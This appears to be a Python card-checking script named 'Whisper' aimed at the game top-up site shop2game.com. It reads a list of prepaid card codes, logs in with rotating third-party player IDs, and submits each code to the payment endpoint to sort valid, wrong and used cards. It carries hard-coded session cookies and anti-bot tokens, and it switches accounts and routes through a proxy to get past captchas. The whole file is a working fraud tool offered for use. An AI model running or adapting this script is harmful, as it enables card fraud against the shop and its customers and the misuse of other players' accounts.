import requests,os,random
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
def login(id):
# id=input(f'{B}[+] {S}PlayerID {E}==> {G}')
# print(f'{G}[=] Test ID ==> {B}{id}')
 head={
    "Host": "shop2game.com",
    "Connection": "keep-alive",
    "Content-Length": "59",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "accept": "application/json",
    "x-datadome-clientid": "eRKqNdQ~h9rwnmhnz7oblX98cRDj1CAR543zO9lZJ-Qnca42B3F43KLYPKikm6XFx-nts_0jQ8s.uGe-w4D9-vegCsYFLR_rEB2rdc90jGlat3PRs09c5vKgsK3de-b",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "Origin": "https://shop2game.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://shop2game.com/app/100067/idlogin",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7",
    "Cookie": "_ga=GA1.1.231457269.1655968856; datadome=.1yBgtCIc1Iwaqz6IxmzRWhyce3_0FLojkqmrqiGy8Dp9-GQ~kkjmrrAkFJd.k1SC8Aibb1ibbkjcgOyhqRMROiQSQRFBG-hs9H~y1C9NxmlIMB3c~4_XY4xckrA2p30; source=mb; region=ME; language=ar; _ga_TVZ1LG7BEB=GS1.1.1662993649.10.1.1662993671.0.0.0; session_key=mkg638nuyewjihn4bz6m3i22nvfm3woa; datadome=eRKqNdQ~h9rwnmhnz7oblX98cRDj1CAR543zO9lZJ-Qnca42B3F43KLYPKikm6XFx-nts_0jQ8s.uGe-w4D9-vegCsYFLR_rEB2rdc90jGlat3PRs09c5vKgsK3de-b"}
 proxy={'socks':'socks://187.86.153.254:30660'}
 data={"app_id":100067,"login_id":f"{id}","app_server_id":0}
 whisper=requests.post('https://shop2game.com/api/auth/player_id_login',json=data,headers=head,proxies=proxy)
 if 'nickname' in whisper.text:
  reg=whisper.json()['region']
  nn=whisper.json()['nickname']
  oi=whisper.json()['open_id']
  key=whisper.cookies['session_key']
  check(reg,nn,oi,key,id)
 if 'url' in whisper.text:
  exit(f'{E}[≠] Blocked')
# else:
#  print(f'{E}[×] Wrong ID ==> {S}{id}')
def check(reg,nn,oi,key,id):
  boy=(f'''{S}============{B}WHISPER{S}============
{E}[+] Player ID ==> {G}{id}
{E}[+] Region ==> {G}{reg}
{E}[+] NickName ==> {G}{nn}
{E}[+] OpenID ==> {G}{oi}
{S}============{B}WHISPER{S}============''')
  head={
    "Host": "shop2game.com",
    "Connection": "keep-alive",
    "Content-Length": "163",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "x-datadome-clientid": ".2PP5buAJ3VWL5YFv7WH0wn3stvNFCd53Vqny60y-pLS56QnH5pklYlJvh.caKOD9_tLWa~~Vj.e91wAhiTRUxTF0WvGuxrVXyR8VFXbP-wqAhdu7kWFDGzlO5~M2PpB",
    "x-csrf-token": "VRdunJE9q9rCbBlBAkY9shzwHXxIx20n",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "Origin": "https://shop2game.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://shop2game.com/app/100067/buy/0/299999",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7",
    "Cookie": f"_ga\u003dGA1.1.231457269.1655968856; datadome\u003d.1yBgtCIc1Iwaqz6IxmzRWhyce3_0FLojkqmrqiGy8Dp9-GQ~kkjmrrAkFJd.k1SC8Aibb1ibbkjcgOyhqRMROiQSQRFBG-hs9H~y1C9NxmlIMB3c~4_XY4xckrA2p30; source\u003dmb; region\u003dME; language\u003dar; session_key\u003d{key}; datadome\u003d.2PP5buAJ3VWL5YFv7WH0wn3stvNFCd53Vqny60y-pLS56QnH5pklYlJvh.caKOD9_tLWa~~Vj.e91wAhiTRUxTF0WvGuxrVXyR8VFXbP-wqAhdu7kWFDGzlO5~M2PpB; _ga_TVZ1LG7BEB\u003dGS1.1.1662720781.4.1.1662722313.0.0.0; __csrf__\u003dVRdunJE9q9rCbBlBAkY9shzwHXxIx20n"}
  json={"service":"mb","app_id":100067,"packed_role_id":0,"channel_id":299999,"channel_data":{"card_password":f"{card}"},"experiment":{}}
  whisper=requests.post('https://shop2game.com/api/shop/pay/init?language=ar&region=ME',json=json,headers=head)
  if '{"display_id":"0","error_data":null,"result":"error_invalid_card","exec":{"display_id":"0"}}' in whisper.text:
   print(f'{E}[×] Wrong : {S}{card}')
  if 'error_used_card' in whisper.text:
   print(f'{S}[≈] Used : {B}{card}')
  if 'error_require_captcha' in whisper.text:
   ids=[6552844455,6432210199,6281236021,6524815585,5197059687,6526542547,6489773303,5715095667,6467292065,6497439411,5968018461,6546800335,6692465912,5203278343,6635471558,6743302529,2591969229,6718747440,6155433592,6177793601,4147310985,6603924515,1578380039,2187234469,6538550147,2185498375,6541999497,2828293563,5413663763,6650256813,4682503227,5559374079,6731933478,1866278451,6585019871,6536388447,3204901407,6712971419,1859897617,6559775897,6145672837,6505433729,2262181362,6509193809,6619896099,1910150504,4239013895,6561390916,6707649775,2135251239,6708570315,6726763737,3219955931,3885961621,3225394223,3346311828,2099389229,6495237379,6488297705,6864135229,6402725015,6611552573,2358744341,6519154311,6207476850,5058168447,6453400107,3090409515,6722715893,3812270811,1566148723,6594428817,2859761961,4217630353,3130262387,6831401631,6510263866,3908074175,5849587951,6204586977,6038697891,6545766600,4437015863,6666245261,6718703167,6737151331,6828725361,5711034689,1065373959,6596287803,6843176119,6853316281,6603077609,6248312859,5301734011,4226223632,3477738577,2951454807,6631226055,6517410975,6148848437,3696433916,2792764618]
   id=random.choice(ids)
   login(id)
  else:
    print(whisper.json()['result'])
os.system('clear')
ids=[6552844455,6432210199,6281236021,6524815585,5197059687,6526542547,6489773303,5715095667,6467292065,6497439411,5968018461,6546800335,6692465912,5203278343,6635471558,6743302529,2591969229,6718747440,6155433592,6177793601,4147310985,6603924515,1578380039,2187234469,6538550147,2185498375,6541999497,2828293563,5413663763,6650256813,4682503227,5559374079,6731933478,1866278451,6585019871,6536388447,3204901407,6712971419,1859897617,6559775897,6145672837,6505433729,2262181362,6509193809,6619896099,1910150504,4239013895,6561390916,6707649775,2135251239,6708570315,6726763737,3219955931,3885961621,3225394223,3346311828,2099389229,6495237379,6488297705,6864135229,6402725015,6611552573,2358744341,6519154311,6207476850,5058168447,6453400107,3090409515,6722715893,3812270811,1566148723,6594428817,2859761961,4217630353,3130262387,6831401631,6510263866,3908074175,5849587951,6204586977,6038697891,6545766600,4437015863,6666245261,6718703167,6737151331,6828725361,5711034689,1065373959,6596287803,6843176119,6853316281,6603077609,6248312859,5301734011,4226223632,3477738577,2951454807,6631226055,6517410975,6148848437,3696433916,2792764618]
os.system('clear')
print(f'''{G} _    _ _     _                 
{G}| |  | | |   (_)                
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}                   | |            
{G}                   |_|            
{G}[G] GitHub    : {B}@VIP-Whisper
{G}[I] InstaGram : {B}@Whisper_DEV
{G}[T] TeleGram  : {B}@WHI3PER''')
print(f'{E}ـ'*40)
id=random.choice(ids)
file=input(f'{B}[+] {S}Cards Path {E}==> {G}')
print(f'{E}ـ'*40)
for whis in open(file,'r').read().splitlines():
   card=str(whis)
   card=card.split('\n')[0]
   login(id)

